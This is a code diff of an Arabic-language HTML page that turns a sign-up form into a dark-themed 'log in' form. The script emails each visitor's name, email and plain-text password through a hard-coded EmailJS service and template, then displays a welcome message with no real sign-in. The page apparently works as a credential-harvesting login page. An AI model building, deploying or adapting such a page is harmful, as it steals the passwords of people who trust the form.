@@ -3,101 +3,101 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تسجيل حساب</title>
+  <title>تسجيل الدخول</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background: #111;
+      color: white;
+      font-family: sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      flex-direction: column;
     }
-
     .form-box {
-      background: white;
-      padding: 25px;
+      background: #222;
+      padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 0 10px #ccc;
-      width: 320px;
+      width: 300px;
+      box-shadow: 0 0 20px #0ff3;
     }
-
     .form-box h2 {
-      margin-bottom: 20px;
       text-align: center;
+      margin-bottom: 15px;
     }
-
-    .form-box input {
+    .form-box input, .form-box button {
       width: 100%;
       padding: 10px;
       margin: 8px 0;
-      border: 1px solid #ccc;
+      border: none;
       border-radius: 5px;
       font-size: 1rem;
     }
-
+    .form-box input {
+      background: #333;
+      color: #fff;
+    }
     .form-box button {
-      width: 100%;
-      padding: 10px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      font-size: 1rem;
-      border-radius: 5px;
+      background: #0ff;
+      color: #000;
+      font-weight: bold;
       cursor: pointer;
     }
-
-    .form-box button:hover {
-      background-color: #0056b3;
-    }
-
-    .success, .error {
-      margin-top: 10px;
+    .form-box .status {
       text-align: center;
+      margin-top: 10px;
       font-weight: bold;
     }
-
-    .success { color: green; }
-    .error { color: red; }
+    .welcome {
+      margin-top: 20px;
+      color: lightgreen;
+      font-size: 1.2rem;
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="form-box">
-    <h2>تسجيل حساب</h2>
-    <form id="signup-form">
+    <h2>تسجيل الدخول</h2>
+    <form id="login-form">
       <input type="text" id="name" placeholder="الاسم الكامل" required />
       <input type="email" id="email" placeholder="البريد الإلكتروني" required />
       <input type="password" id="password" placeholder="كلمة المرور" required />
-      <button type="submit">تسجيل</button>
+      <button type="submit">دخول</button>
     </form>
-    <div class="success" id="success-message"></div>
-    <div class="error" id="error-message"></div>
+    <div class="status" id="status"></div>
   </div>
 
-  <script>
-    emailjs.init("lWw2gKUVTBg4YtukfAQ_1");
+  <div class="welcome" id="welcome">مرحبًا بك</div>
 
-    document.getElementById("signup-form").addEventListener("submit", function(event) {
-      event.preventDefault();
+  <script>
+    (function(){
+      emailjs.init("OUzdp9GCPTEHnHt82");
+    })();
+
+    document.getElementById("login-form").addEventListener("submit", function(e) {
+      e.preventDefault();
 
       const name = document.getElementById("name").value;
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      emailjs.send("service_i03b81g", "OUzdp9GCPTEHnHt82", {
+      emailjs.send("service_i03b81g", "template_ki79uxb", {
         name: name,
         email: email,
         password: password
-      })
-      .then(function(response) {
-        document.getElementById("success-message").textContent = "تم الإرسال بنجاح!";
-        document.getElementById("error-message").textContent = "";
+      }).then(function(response) {
+        document.getElementById("status").textContent = "تم الإرسال بنجاح.";
+        document.getElementById("status").style.color = "lightgreen";
+        document.getElementById("welcome").style.display = "block";
       }, function(error) {
-        document.getElementById("error-message").textContent = "فشل الإرسال!";
-        document.getElementById("success-message").textContent = "";
+        document.getElementById("status").textContent = "فشل الإرسال!";
+        document.getElementById("status").style.color = "red";
+        console.error(error);
       });
     });
   </script>
 </body>
-      </html>
+</html>
